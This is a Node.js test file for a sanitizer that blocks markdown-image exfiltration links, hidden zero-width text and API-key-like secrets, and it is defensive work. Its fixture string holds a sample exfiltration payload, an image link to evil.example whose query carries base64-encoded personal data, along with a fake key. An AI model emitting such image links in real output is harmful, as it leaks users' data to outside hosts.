import { test } from "node:test";
import assert from "node:assert/strict";
import { plug } from "../lib/plug.ts";

test("blocks exfil links, hidden text and secrets; allows listed hosts and plain links", () => {
  const bad = "![x](https://evil.example/p.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQuZXhhbXBsZQ==) hi​ there key sk-ant-api03-Zk3vQ9xT2mLp8RwYc5HnJd7A";
  const r = plug(bad);
  assert.deepEqual(r.findings.map((f) => f.type).sort(), ["HIDDEN_TEXT", "SECRET", "URL"]);
  assert.ok(!r.text.includes("evil.example/p.png") && !r.text.includes("sk-ant") && !r.text.includes("​"));
  const ok = "See https://docs.example.com/guide?page=2 and ![x](https://cdn.example.com/a.png?token=abcdefghijklmnopqrstuvwxyz)";
  assert.equal(plug(ok, ["cdn.example.com"]).findings.length, 0);
});
